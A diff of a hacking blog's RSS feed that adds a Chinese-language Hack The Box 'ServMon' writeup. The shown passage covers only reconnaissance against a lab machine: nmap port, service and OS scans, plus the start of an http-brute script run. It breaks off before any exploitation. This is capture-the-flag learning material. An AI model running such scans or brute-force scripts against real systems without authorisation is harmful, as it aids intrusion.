@@ -1,4 +1,829 @@
-<rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom"><channel><title>Posts on Welcome My Hack's Blog</title><link>https://enilmalus.github.io/posts/</link><description>Recent content in Posts on Welcome My Hack's Blog</description><generator>Hugo -- gohugo.io</generator><language>en-us</language><lastBuildDate>Mon, 02 Mar 2026 14:00:00 +0800</lastBuildDate><atom:link href="https://enilmalus.github.io/posts/index.xml" rel="self" type="application/rss+xml"/><item><title>Windows 提权专区</title><link>https://enilmalus.github.io/posts/windows-%E6%8F%90%E6%9D%83%E4%B8%93%E5%8C%BA/</link><pubDate>Mon, 02 Mar 2026 14:00:00 +0800</pubDate><guid>https://enilmalus.github.io/posts/windows-%E6%8F%90%E6%9D%83%E4%B8%93%E5%8C%BA/</guid><description>枚举 systeminfo c:\windows\system32\inetsrv&amp;gt;systeminfo systeminfo Host Name: JSON OS Name: Microsoft Windows Server 2012 R2 Datacenter OS Version: 6.3.9600 N/A Build 9600 OS Manufacturer: Microsoft Corporation OS Configuration: Standalone Server OS Build Type: Multiprocessor Free Registered Owner: Windows User Registered Organization: Product ID: 00252-80005-00001-AA602 Original Install Date: 5/22/2019, 4:27:16 PM System Boot Time: 3/1/2026, 8:27:41 PM System Manufacturer: VMware, Inc. System Model: VMware Virtual Platform System Type: x64-based PC Processor(s): 2 Processor(s) Installed.</description><content type="html"><![CDATA[<h2 id="枚举">枚举</h2>
+<rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom"><channel><title>Posts on Welcome My Hack's Blog</title><link>https://enilmalus.github.io/posts/</link><description>Recent content in Posts on Welcome My Hack's Blog</description><generator>Hugo -- gohugo.io</generator><language>en-us</language><lastBuildDate>Thu, 12 Mar 2026 10:00:00 +0800</lastBuildDate><atom:link href="https://enilmalus.github.io/posts/index.xml" rel="self" type="application/rss+xml"/><item><title>HTB-ServMon Writeup</title><link>https://enilmalus.github.io/posts/htb-servmon-writeup/</link><pubDate>Thu, 12 Mar 2026 10:00:00 +0800</pubDate><guid>https://enilmalus.github.io/posts/htb-servmon-writeup/</guid><description>初始侦察 Nmap 端口扫描 ┌──(kali㉿kali)-[~/Work/Kali] └─$ sudo nmap --min-rate 10000 -p- 10.129.227.77 -oA ports Starting Nmap 7.95 ( https://nmap.org ) at 2026-03-11 22:17 EDT Nmap scan report for 10.129.227.77 Host is up (0.12s latency). Not shown: 65518 closed tcp ports (reset) PORT STATE SERVICE 21/tcp open ftp 22/tcp open ssh 80/tcp open http 135/tcp open msrpc 139/tcp open netbios-ssn 445/tcp open microsoft-ds 5666/tcp open nrpe 6063/tcp open x11 6699/tcp open napster 8443/tcp open https-alt 49664/tcp open unknown 49665/tcp open unknown 49666/tcp open unknown 49667/tcp open unknown 49668/tcp open unknown 49669/tcp open unknown 49670/tcp open unknown Nmap done: 1 IP address (1 host up) scanned in 10.</description><content type="html"><![CDATA[<h2 id="初始侦察">初始侦察</h2>
+<h3 id="nmap-端口扫描">Nmap 端口扫描</h3>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>┌──<span style="color:#f92672">(</span>kali㉿kali<span style="color:#f92672">)</span>-<span style="color:#f92672">[</span>~/Work/Kali<span style="color:#f92672">]</span>                                                                            
+</span></span><span style="display:flex;"><span>└─$ sudo nmap --min-rate <span style="color:#ae81ff">10000</span> -p- 10.129.227.77 -oA ports                                               
+</span></span><span style="display:flex;"><span>Starting Nmap 7.95 <span style="color:#f92672">(</span> https://nmap.org <span style="color:#f92672">)</span> at 2026-03-11 22:17 EDT                                          
+</span></span><span style="display:flex;"><span>Nmap scan report <span style="color:#66d9ef">for</span> 10.129.227.77                                                                       
+</span></span><span style="display:flex;"><span>Host is up <span style="color:#f92672">(</span>0.12s latency<span style="color:#f92672">)</span>.                                                                              
+</span></span><span style="display:flex;"><span>Not shown: <span style="color:#ae81ff">65518</span> closed tcp ports <span style="color:#f92672">(</span>reset<span style="color:#f92672">)</span>                                                                
+</span></span><span style="display:flex;"><span>PORT      STATE SERVICE                                                                                  
+</span></span><span style="display:flex;"><span>21/tcp    open  ftp                                                                                      
+</span></span><span style="display:flex;"><span>22/tcp    open  ssh                                                                                      
+</span></span><span style="display:flex;"><span>80/tcp    open  http                                                                                     
+</span></span><span style="display:flex;"><span>135/tcp   open  msrpc                                                                                    
+</span></span><span style="display:flex;"><span>139/tcp   open  netbios-ssn                                                                              
+</span></span><span style="display:flex;"><span>445/tcp   open  microsoft-ds                                                                             
+</span></span><span style="display:flex;"><span>5666/tcp  open  nrpe                                                                                     
+</span></span><span style="display:flex;"><span>6063/tcp  open  x11                                                                                      
+</span></span><span style="display:flex;"><span>6699/tcp  open  napster                                                                                  
+</span></span><span style="display:flex;"><span>8443/tcp  open  https-alt                                                                                
+</span></span><span style="display:flex;"><span>49664/tcp open  unknown                                                                                  
+</span></span><span style="display:flex;"><span>49665/tcp open  unknown                                                                                  
+</span></span><span style="display:flex;"><span>49666/tcp open  unknown                                                                                  
+</span></span><span style="display:flex;"><span>49667/tcp open  unknown                                                                                  
+</span></span><span style="display:flex;"><span>49668/tcp open  unknown                                                                                  
+</span></span><span style="display:flex;"><span>49669/tcp open  unknown                                                                                  
+</span></span><span style="display:flex;"><span>49670/tcp open  unknown                                                                                  
+</span></span><span style="display:flex;"><span>                                                                                                         
+</span></span><span style="display:flex;"><span>Nmap <span style="color:#66d9ef">done</span>: <span style="color:#ae81ff">1</span> IP address <span style="color:#f92672">(</span><span style="color:#ae81ff">1</span> host up<span style="color:#f92672">)</span> scanned in 10.80 seconds
+</span></span></code></pre></div><p>提取端口做备用。</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>┌──<span style="color:#f92672">(</span>kali㉿kali<span style="color:#f92672">)</span>-<span style="color:#f92672">[</span>~/Work/Kali<span style="color:#f92672">]</span>
+</span></span><span style="display:flex;"><span>└─$ grep open ports.nmap | awk -F <span style="color:#e6db74">&#39;/&#39;</span> <span style="color:#e6db74">&#39;{print $1}&#39;</span> | paste -sd <span style="color:#e6db74">&#39;,&#39;</span>
+</span></span><span style="display:flex;"><span>21,22,80,135,139,445,5666,6063,6699,8443,49664,49665,49666,49667,49668,49669,49670
+</span></span></code></pre></div><h3 id="nmap-udp-端口扫描">Nmap UDP 端口扫描</h3>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>┌──<span style="color:#f92672">(</span>kali㉿kali<span style="color:#f92672">)</span>-<span style="color:#f92672">[</span>~/Work/Kali<span style="color:#f92672">]</span>
+</span></span><span style="display:flex;"><span>└─$ sudo nmap -sU -Pn --top-ports <span style="color:#ae81ff">20</span> -p- 10.129.227.77
+</span></span><span style="display:flex;"><span>Starting Nmap 7.95 <span style="color:#f92672">(</span> https://nmap.org <span style="color:#f92672">)</span> at 2026-03-11 22:24 EDT
+</span></span><span style="display:flex;"><span>Nmap scan report <span style="color:#66d9ef">for</span> 10.129.227.77
+</span></span><span style="display:flex;"><span>Host is up <span style="color:#f92672">(</span>0.15s latency<span style="color:#f92672">)</span>.
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>PORT      STATE         SERVICE
+</span></span><span style="display:flex;"><span>53/udp    closed        domain
+</span></span><span style="display:flex;"><span>67/udp    closed        dhcps
+</span></span><span style="display:flex;"><span>68/udp    closed        dhcpc
+</span></span><span style="display:flex;"><span>69/udp    closed        tftp
+</span></span><span style="display:flex;"><span>123/udp   open|filtered ntp
+</span></span><span style="display:flex;"><span>135/udp   closed        msrpc
+</span></span><span style="display:flex;"><span>137/udp   open|filtered netbios-ns
+</span></span><span style="display:flex;"><span>138/udp   open|filtered netbios-dgm
+</span></span><span style="display:flex;"><span>139/udp   closed        netbios-ssn
+</span></span><span style="display:flex;"><span>161/udp   closed        snmp
+</span></span><span style="display:flex;"><span>162/udp   closed        snmptrap
+</span></span><span style="display:flex;"><span>445/udp   closed        microsoft-ds
+</span></span><span style="display:flex;"><span>500/udp   open|filtered isakmp
+</span></span><span style="display:flex;"><span>514/udp   closed        syslog
+</span></span><span style="display:flex;"><span>520/udp   closed        route
+</span></span><span style="display:flex;"><span>631/udp   closed        ipp
+</span></span><span style="display:flex;"><span>1434/udp  open|filtered ms-sql-m
+</span></span><span style="display:flex;"><span>1900/udp  closed        upnp
+</span></span><span style="display:flex;"><span>4500/udp  open|filtered nat-t-ike
+</span></span><span style="display:flex;"><span>49152/udp closed        unknown
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>Nmap <span style="color:#66d9ef">done</span>: <span style="color:#ae81ff">1</span> IP address <span style="color:#f92672">(</span><span style="color:#ae81ff">1</span> host up<span style="color:#f92672">)</span> scanned in 20.09 seconds
+</span></span></code></pre></div><p>未扫描出明确开放的 UDP 端口。</p>
+<h3 id="nmap-详细信息扫描">Nmap 详细信息扫描</h3>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>┌──<span style="color:#f92672">(</span>kali㉿kali<span style="color:#f92672">)</span>-<span style="color:#f92672">[</span>~/Work/Kali<span style="color:#f92672">]</span>
+</span></span><span style="display:flex;"><span>└─$ sudo nmap -sT -sC -sV -O -p21,22,80,135,139,445,5666,6063,6699,8443,49664,49665,49666,49667,49668,49669,49670 10.129.227.77
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>sudo<span style="color:#f92672">]</span> password <span style="color:#66d9ef">for</span> kali: 
+</span></span><span style="display:flex;"><span>Starting Nmap 7.95 <span style="color:#f92672">(</span> https://nmap.org <span style="color:#f92672">)</span> at 2026-03-11 22:23 EDT
+</span></span><span style="display:flex;"><span>Nmap scan report <span style="color:#66d9ef">for</span> 10.129.227.77
+</span></span><span style="display:flex;"><span>Host is up <span style="color:#f92672">(</span>0.073s latency<span style="color:#f92672">)</span>.
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>PORT      STATE SERVICE       VERSION
+</span></span><span style="display:flex;"><span>21/tcp    open  ftp           Microsoft ftpd
+</span></span><span style="display:flex;"><span>| ftp-syst: 
+</span></span><span style="display:flex;"><span>|_  SYST: Windows_NT
+</span></span><span style="display:flex;"><span>| ftp-anon: Anonymous FTP login allowed <span style="color:#f92672">(</span>FTP code 230<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>|_02-28-22  07:35PM       &lt;DIR&gt;          Users
+</span></span><span style="display:flex;"><span>22/tcp    open  ssh           OpenSSH for_Windows_8.0 <span style="color:#f92672">(</span>protocol 2.0<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>| ssh-hostkey: 
+</span></span><span style="display:flex;"><span>|   <span style="color:#ae81ff">3072</span> c7:1a:f6:81:ca:17:78:d0:27:db:cd:46:2a:09:2b:54 <span style="color:#f92672">(</span>RSA<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>|   <span style="color:#ae81ff">256</span> 3e:63:ef:3b:6e:3e:4a:90:f3:4c:02:e9:40:67:2e:42 <span style="color:#f92672">(</span>ECDSA<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>|_  <span style="color:#ae81ff">256</span> 5a:48:c8:cd:39:78:21:29:ef:fb:ae:82:1d:03:ad:af <span style="color:#f92672">(</span>ED25519<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>80/tcp    open  http
+</span></span><span style="display:flex;"><span>|_http-title: Site doesn<span style="color:#960050;background-color:#1e0010">&#39;</span>t have a title <span style="color:#f92672">(</span>text/html<span style="color:#f92672">)</span>.
+</span></span><span style="display:flex;"><span>| fingerprint-strings: 
+</span></span><span style="display:flex;"><span>|   GetRequest, HTTPOptions, RTSPRequest: 
+</span></span><span style="display:flex;"><span>|     HTTP/1.1 <span style="color:#ae81ff">200</span> OK
+</span></span><span style="display:flex;"><span>|     Content-type: text/html
+</span></span><span style="display:flex;"><span>|     Content-Length: <span style="color:#ae81ff">340</span>
+</span></span><span style="display:flex;"><span>|     Connection: close
+</span></span><span style="display:flex;"><span>|     AuthInfo: 
+</span></span><span style="display:flex;"><span>|     &lt;!DOCTYPE html PUBLIC <span style="color:#e6db74">&#34;-//W3C//DTD XHTML 1.0 Transitional//EN&#34;</span> <span style="color:#e6db74">&#34;http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd&#34;</span>&gt;
+</span></span><span style="display:flex;"><span>|     &lt;html xmlns<span style="color:#f92672">=</span><span style="color:#e6db74">&#34;http://www.w3.org/1999/xhtml&#34;</span>&gt;
+</span></span><span style="display:flex;"><span>|     &lt;head&gt;
+</span></span><span style="display:flex;"><span>|     &lt;title&gt;&lt;/title&gt;
+</span></span><span style="display:flex;"><span>|     &lt;script type<span style="color:#f92672">=</span><span style="color:#e6db74">&#34;text/javascript&#34;</span>&gt;
+</span></span><span style="display:flex;"><span>|     window.location.href <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;Pages/login.htm&#34;</span>;
+</span></span><span style="display:flex;"><span>|     &lt;/script&gt;
+</span></span><span style="display:flex;"><span>|     &lt;/head&gt;
+</span></span><span style="display:flex;"><span>|     &lt;body&gt;
+</span></span><span style="display:flex;"><span>|     &lt;/body&gt;
+</span></span><span style="display:flex;"><span>|     &lt;/html&gt;
+</span></span><span style="display:flex;"><span>|   NULL: 
+</span></span><span style="display:flex;"><span>|     HTTP/1.1 <span style="color:#ae81ff">408</span> Request Timeout
+</span></span><span style="display:flex;"><span>|     Content-type: text/html
+</span></span><span style="display:flex;"><span>|     Content-Length: <span style="color:#ae81ff">0</span>
+</span></span><span style="display:flex;"><span>|     Connection: close
+</span></span><span style="display:flex;"><span>|_    AuthInfo:
+</span></span><span style="display:flex;"><span>135/tcp   open  msrpc         Microsoft Windows RPC
+</span></span><span style="display:flex;"><span>139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn
+</span></span><span style="display:flex;"><span>445/tcp   open  microsoft-ds?
+</span></span><span style="display:flex;"><span>5666/tcp  open  tcpwrapped
+</span></span><span style="display:flex;"><span>6063/tcp  open  x11?
+</span></span><span style="display:flex;"><span>6699/tcp  open  napster?
+</span></span><span style="display:flex;"><span>8443/tcp  open  ssl/https-alt
+</span></span><span style="display:flex;"><span>|_ssl-date: TLS randomness does not represent time
+</span></span><span style="display:flex;"><span>| http-title: NSClient++
+</span></span><span style="display:flex;"><span>|_Requested resource was /index.html
+</span></span><span style="display:flex;"><span>| ssl-cert: Subject: commonName<span style="color:#f92672">=</span>localhost
+</span></span><span style="display:flex;"><span>| Not valid before: 2020-01-14T13:24:20
+</span></span><span style="display:flex;"><span>|_Not valid after:  2021-01-13T13:24:20
+</span></span><span style="display:flex;"><span>| fingerprint-strings: 
+</span></span><span style="display:flex;"><span>|   FourOhFourRequest, HTTPOptions, RTSPRequest, SIPOptions: 
+</span></span><span style="display:flex;"><span>|     HTTP/1.1 <span style="color:#ae81ff">404</span>
+</span></span><span style="display:flex;"><span>|     Content-Length: <span style="color:#ae81ff">18</span>
+</span></span><span style="display:flex;"><span>|     Document not found
+</span></span><span style="display:flex;"><span>|   GetRequest: 
+</span></span><span style="display:flex;"><span>|     HTTP/1.1 <span style="color:#ae81ff">302</span>
+</span></span><span style="display:flex;"><span>|     Content-Length: <span style="color:#ae81ff">0</span>
+</span></span><span style="display:flex;"><span>|     Location: /index.html
+</span></span><span style="display:flex;"><span>|     workers
+</span></span><span style="display:flex;"><span>|_    jobs
+</span></span><span style="display:flex;"><span>49664/tcp open  msrpc         Microsoft Windows RPC
+</span></span><span style="display:flex;"><span>49665/tcp open  msrpc         Microsoft Windows RPC
+</span></span><span style="display:flex;"><span>49666/tcp open  msrpc         Microsoft Windows RPC
+</span></span><span style="display:flex;"><span>49667/tcp open  msrpc         Microsoft Windows RPC
+</span></span><span style="display:flex;"><span>49668/tcp open  msrpc         Microsoft Windows RPC
+</span></span><span style="display:flex;"><span>49669/tcp open  msrpc         Microsoft Windows RPC
+</span></span><span style="display:flex;"><span>49670/tcp open  msrpc         Microsoft Windows RPC
+</span></span><span style="display:flex;"><span><span style="color:#ae81ff">2</span> services unrecognized despite returning data. If you know the service/version, please submit the following fingerprints at https://nmap.org/cgi-bin/submit.cgi?new-service :
+</span></span><span style="display:flex;"><span><span style="color:#f92672">==============</span>NEXT SERVICE FINGERPRINT <span style="color:#f92672">(</span>SUBMIT INDIVIDUALLY<span style="color:#f92672">)==============</span>
+</span></span><span style="display:flex;"><span>SF-Port80-TCP:V<span style="color:#f92672">=</span>7.95%I<span style="color:#f92672">=</span>7%D<span style="color:#f92672">=</span>3/11%Time<span style="color:#f92672">=</span>69B2239D%P<span style="color:#f92672">=</span>x86_64-pc-linux-gnu%r<span style="color:#f92672">(</span>NULL
+</span></span><span style="display:flex;"><span>SF:,6B,<span style="color:#e6db74">&#34;HTTP/1\.1\x20408\x20Request\x20Timeout\r\nContent-type:\x20text/ht
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">SF:ml\r\nContent-Length:\x200\r\nConnection:\x20close\r\nAuthInfo:\x20\r\n
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">SF:\r\n&#34;</span><span style="color:#f92672">)</span>%r<span style="color:#f92672">(</span>GetRequest,1B4,<span style="color:#e6db74">&#34;HTTP/1\.1\x20200\x20OK\r\nContent-type:\x20tex
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">SF:t/html\r\nContent-Length:\x20340\r\nConnection:\x20close\r\nAuthInfo:\x
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">SF:20\r\n\r\n\xef\xbb\xbf&lt;!DOCTYPE\x20html\x20PUBLIC\x20\&#34;-//W3C//DTD\x20X
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">SF:HTML\x201\.0\x20Transitional//EN\&#34;\x20\&#34;http://www\.w3\.org/TR/xhtml1/D
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">SF:TD/xhtml1-transitional\.dtd\&#34;&gt;\r\n\r\n&lt;html\x20xmlns=\&#34;http://www\.w3\.
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">SF:org/1999/xhtml\&#34;&gt;\r\n&lt;head&gt;\r\n\x20\x20\x20\x20&lt;title&gt;&lt;/title&gt;\r\n\x20\
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">SF:x20\x20\x20&lt;script\x20type=\&#34;text/javascript\&#34;&gt;\r\n\x20\x20\x20\x20\x20
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">SF:\x20\x20\x20window\.location\.href\x20=\x20\&#34;Pages/login\.htm\&#34;;\r\n\x2
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">SF:0\x20\x20\x20&lt;/script&gt;\r\n&lt;/head&gt;\r\n&lt;body&gt;\r\n&lt;/body&gt;\r\n&lt;/html&gt;\r\n&#34;</span><span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>SF:%r<span style="color:#f92672">(</span>HTTPOptions,1B4,<span style="color:#e6db74">&#34;HTTP/1\.1\x20200\x20OK\r\nContent-type:\x20text/htm
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">SF:l\r\nContent-Length:\x20340\r\nConnection:\x20close\r\nAuthInfo:\x20\r\
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">SF:n\r\n\xef\xbb\xbf&lt;!DOCTYPE\x20html\x20PUBLIC\x20\&#34;-//W3C//DTD\x20XHTML\
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">SF:x201\.0\x20Transitional//EN\&#34;\x20\&#34;http://www\.w3\.org/TR/xhtml1/DTD/xh
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">SF:tml1-transitional\.dtd\&#34;&gt;\r\n\r\n&lt;html\x20xmlns=\&#34;http://www\.w3\.org/1
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">SF:999/xhtml\&#34;&gt;\r\n&lt;head&gt;\r\n\x20\x20\x20\x20&lt;title&gt;&lt;/title&gt;\r\n\x20\x20\x
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">SF:20\x20&lt;script\x20type=\&#34;text/javascript\&#34;&gt;\r\n\x20\x20\x20\x20\x20\x20\
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">SF:x20\x20window\.location\.href\x20=\x20\&#34;Pages/login\.htm\&#34;;\r\n\x20\x20
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">SF:\x20\x20&lt;/script&gt;\r\n&lt;/head&gt;\r\n&lt;body&gt;\r\n&lt;/body&gt;\r\n&lt;/html&gt;\r\n&#34;</span><span style="color:#f92672">)</span>%r<span style="color:#f92672">(</span>RT
+</span></span><span style="display:flex;"><span>SF:SPRequest,1B4,<span style="color:#e6db74">&#34;HTTP/1\.1\x20200\x20OK\r\nContent-type:\x20text/html\r\n
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">SF:Content-Length:\x20340\r\nConnection:\x20close\r\nAuthInfo:\x20\r\n\r\n
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">SF:\xef\xbb\xbf&lt;!DOCTYPE\x20html\x20PUBLIC\x20\&#34;-//W3C//DTD\x20XHTML\x201\
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">SF:.0\x20Transitional//EN\&#34;\x20\&#34;http://www\.w3\.org/TR/xhtml1/DTD/xhtml1-
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">SF:transitional\.dtd\&#34;&gt;\r\n\r\n&lt;html\x20xmlns=\&#34;http://www\.w3\.org/1999/x
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">SF:html\&#34;&gt;\r\n&lt;head&gt;\r\n\x20\x20\x20\x20&lt;title&gt;&lt;/title&gt;\r\n\x20\x20\x20\x2
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">SF:0&lt;script\x20type=\&#34;text/javascript\&#34;&gt;\r\n\x20\x20\x20\x20\x20\x20\x20\x
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">SF:20window\.location\.href\x20=\x20\&#34;Pages/login\.htm\&#34;;\r\n\x20\x20\x20\
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">SF:x20&lt;/script&gt;\r\n&lt;/head&gt;\r\n&lt;body&gt;\r\n&lt;/body&gt;\r\n&lt;/html&gt;\r\n&#34;</span><span style="color:#f92672">)</span>;
+</span></span><span style="display:flex;"><span><span style="color:#f92672">==============</span>NEXT SERVICE FINGERPRINT <span style="color:#f92672">(</span>SUBMIT INDIVIDUALLY<span style="color:#f92672">)==============</span>
+</span></span><span style="display:flex;"><span>SF-Port8443-TCP:V<span style="color:#f92672">=</span>7.95%T<span style="color:#f92672">=</span>SSL%I<span style="color:#f92672">=</span>7%D<span style="color:#f92672">=</span>3/11%Time<span style="color:#f92672">=</span>69B223A6%P<span style="color:#f92672">=</span>x86_64-pc-linux-gn
+</span></span><span style="display:flex;"><span>SF:u%r<span style="color:#f92672">(</span>GetRequest,74,<span style="color:#e6db74">&#34;HTTP/1\.1\x20302\r\nContent-Length:\x200\r\nLocation
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">SF::\x20/index\.html\r\n\r\n\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">SF:\0\0\0\0\0\0\x12\x02\x18\0\x1aC\n\x07workers\x12\n\n\x04jobs\x12\x02\x1
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">SF:8h\x12\x0f&#34;</span><span style="color:#f92672">)</span>%r<span style="color:#f92672">(</span>HTTPOptions,36,<span style="color:#e6db74">&#34;HTTP/1\.1\x20404\r\nContent-Length:\x201
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">SF:8\r\n\r\nDocument\x20not\x20found&#34;</span><span style="color:#f92672">)</span>%r<span style="color:#f92672">(</span>FourOhFourRequest,36,<span style="color:#e6db74">&#34;HTTP/1\.1\x
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">SF:20404\r\nContent-Length:\x2018\r\n\r\nDocument\x20not\x20found&#34;</span><span style="color:#f92672">)</span>%r<span style="color:#f92672">(</span>RTSP
+</span></span><span style="display:flex;"><span>SF:Request,36,<span style="color:#e6db74">&#34;HTTP/1\.1\x20404\r\nContent-Length:\x2018\r\n\r\nDocument\x
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">SF:20not\x20found&#34;</span><span style="color:#f92672">)</span>%r<span style="color:#f92672">(</span>SIPOptions,36,<span style="color:#e6db74">&#34;HTTP/1\.1\x20404\r\nContent-Length:\x
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">SF:2018\r\n\r\nDocument\x20not\x20found&#34;</span><span style="color:#f92672">)</span>;
+</span></span><span style="display:flex;"><span>Warning: OSScan results may be unreliable because we could not find at least <span style="color:#ae81ff">1</span> open and <span style="color:#ae81ff">1</span> closed port
+</span></span><span style="display:flex;"><span>Aggressive OS guesses: Microsoft Windows Server <span style="color:#ae81ff">2019</span> <span style="color:#f92672">(</span>96%<span style="color:#f92672">)</span>, Microsoft Windows Server <span style="color:#ae81ff">2016</span> <span style="color:#f92672">(</span>95%<span style="color:#f92672">)</span>, Microsoft Windows <span style="color:#ae81ff">10</span> <span style="color:#f92672">(</span>93%<span style="color:#f92672">)</span>, Microsoft Windows <span style="color:#ae81ff">10</span> <span style="color:#ae81ff">1709</span> - 21H2 <span style="color:#f92672">(</span>93%<span style="color:#f92672">)</span>, Microsoft Windows <span style="color:#ae81ff">10</span> <span style="color:#ae81ff">1903</span> <span style="color:#f92672">(</span>93%<span style="color:#f92672">)</span>, Microsoft Windows <span style="color:#ae81ff">10</span> 21H1 <span style="color:#f92672">(</span>93%<span style="color:#f92672">)</span>, Microsoft Windows Server <span style="color:#ae81ff">2022</span> <span style="color:#f92672">(</span>93%<span style="color:#f92672">)</span>, Microsoft Windows Server <span style="color:#ae81ff">2012</span> <span style="color:#f92672">(</span>92%<span style="color:#f92672">)</span>, Microsoft Windows <span style="color:#ae81ff">10</span> <span style="color:#ae81ff">1803</span> <span style="color:#f92672">(</span>92%<span style="color:#f92672">)</span>, Windows Server <span style="color:#ae81ff">2019</span> <span style="color:#f92672">(</span>92%<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>No exact OS matches <span style="color:#66d9ef">for</span> host <span style="color:#f92672">(</span>test conditions non-ideal<span style="color:#f92672">)</span>.
+</span></span><span style="display:flex;"><span>Network Distance: <span style="color:#ae81ff">2</span> hops
+</span></span><span style="display:flex;"><span>Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>Host script results:
+</span></span><span style="display:flex;"><span>| smb2-security-mode: 
+</span></span><span style="display:flex;"><span>|   3:1:1: 
+</span></span><span style="display:flex;"><span>|_    Message signing enabled but not required
+</span></span><span style="display:flex;"><span>| smb2-time: 
+</span></span><span style="display:flex;"><span>|   date: 2026-03-12T02:25:41
+</span></span><span style="display:flex;"><span>|_  start_date: N/A
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+</span></span><span style="display:flex;"><span>Nmap <span style="color:#66d9ef">done</span>: <span style="color:#ae81ff">1</span> IP address <span style="color:#f92672">(</span><span style="color:#ae81ff">1</span> host up<span style="color:#f92672">)</span> scanned in 154.43 seconds
+</span></span></code></pre></div><p>扫描结果显示 21/ftp 端口可能可以使用 <code>anonymous</code> 进行匿名登录。</p>
+<h3 id="nmap-漏洞脚本扫描">Nmap 漏洞脚本扫描</h3>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>┌──<span style="color:#f92672">(</span>kali㉿kali<span style="color:#f92672">)</span>-<span style="color:#f92672">[</span>~/Work/Kali<span style="color:#f92672">]</span>
+</span></span><span style="display:flex;"><span>└─$ sudo nmap --script<span style="color:#f92672">=</span>http-brute -p 21,22,80,135,139,445,5666,6063,6699,8443,49664,49665,49666,49667,49668,49669,49670 10.129.227.77
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>sudo<span style="color:#f92672">]</span> password <span style="color:#66d9ef">for</span> kali: 
+</span></span><span style="display:flex;"><span>Starting Nmap 7.95 <span style="color:#f92672">(</span> https://nmap.org <span style="color:#f92672">)</span> at 2026-03-11 22:25 EDT
+</span></span><span style="display:flex;"><span>Nmap scan report <span style="color:#66d9ef">for</span> 10.129.227.77
+</span></span><span style="display:flex;"><span>Host is up <span style="color:#f92672">(</span>0.12s latency<span style="color:#f92672">)</span>.
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>PORT      STATE SERVICE
+</span></span><span style="display:flex;"><span>21/tcp    open  ftp
+</span></span><span style="display:flex;"><span>22/tcp    open  ssh
+</span></span><span style="display:flex;"><span>80/tcp    open  http
+</span></span><span style="display:flex;"><span>| http-brute:   
+</span></span><span style="display:flex;"><span>|_  Path <span style="color:#e6db74">&#34;/&#34;</span> does not require authentication
+</span></span><span style="display:flex;"><span>135/tcp   open  msrpc
+</span></span><span style="display:flex;"><span>139/tcp   open  netbios-ssn
